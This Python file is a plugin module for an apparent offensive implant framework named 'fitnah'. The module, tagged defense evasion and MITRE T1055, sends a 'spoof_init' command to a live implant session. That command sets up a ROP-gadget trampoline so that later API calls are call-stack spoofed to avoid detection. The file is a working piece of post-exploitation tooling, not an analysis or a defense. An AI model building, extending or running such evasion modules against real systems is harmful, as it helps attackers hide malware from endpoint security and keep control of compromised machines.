"""defense_evasion/module_trampoline — ROP gadget trampoline via implant SpoofCall(). MITRE T1055"""
from fitnah.sdk import BasePlugin, ModuleResult, ParamSchema, mitre


class ModuleTrampoline(BasePlugin):
    NAME        = "module_trampoline"
    DESCRIPTION = "Initialize ROP gadget trampoline (SpoofInit) so SpoofCall() wraps future API calls."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema()

    @mitre("T1055")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.send("spoof_init", {})
        if r["status"] != "ok":
            return ModuleResult.err(f"spoof_init failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or "Gadget trampoline ready — SpoofCall() active")
